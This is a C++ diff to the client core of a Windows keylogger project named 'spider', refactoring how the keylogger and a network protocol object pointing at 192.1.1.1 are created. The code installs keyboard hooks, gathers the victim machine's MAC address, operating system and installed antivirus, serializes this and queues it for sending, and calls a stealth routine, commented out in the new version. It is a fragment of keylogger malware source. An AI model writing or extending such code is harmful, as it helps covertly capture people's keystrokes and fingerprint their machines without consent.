@@ -11,11 +11,11 @@
 #include "Protocol/Buffer.hpp"
 #include "Protocol/ClientProtocol.hpp"
 #include "Protocol/ServerProtocol.hpp"
-#include "WindowsKeyLogger.hpp"
+#include "KeyLogger/WindowsKeyLogger.hpp"
 #include "ClientCore.hpp"
 
-spider::ClientCore::ClientCore() : _proto(spider::ClientProtocol("192.1.1.1", PORT)),
-				   _keylogger(spider::WindowsKeyLogger())
+spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol("192.1.1.1", PORT)),
+				   _keylogger(new spider::WindowsKeyLogger())
 {}
 
 spider::ClientCore::~ClientCore()
@@ -25,21 +25,20 @@ void spider::ClientCore::run()
 {
   MSG msg;
   bool running;
-  spider::WindowsKeyLogger keylogger;
 
   running = true;
-  keylogger.stealth();
-  keylogger.initHooks();
-  keylogger.getMacAddr();
-  keylogger.getOperatingSystem();
-  keylogger.getAntiVirus();
-  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(keylogger.getInfos())));
+  //_keylogger->stealth();
+  _keylogger->initHooks();
+  _keylogger->getMacAddr();
+  _keylogger->getOperatingSystem();
+  _keylogger->getAntiVirus();
+  spider::Buffer::BufferInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
   while (running)
   {
     if (!GetMessage(&msg, NULL, 0, 0))
       running = false;
     TranslateMessage(&msg);
     DispatchMessage(&msg);
-    _proto.run();
+    _proto->run();
   }
 }
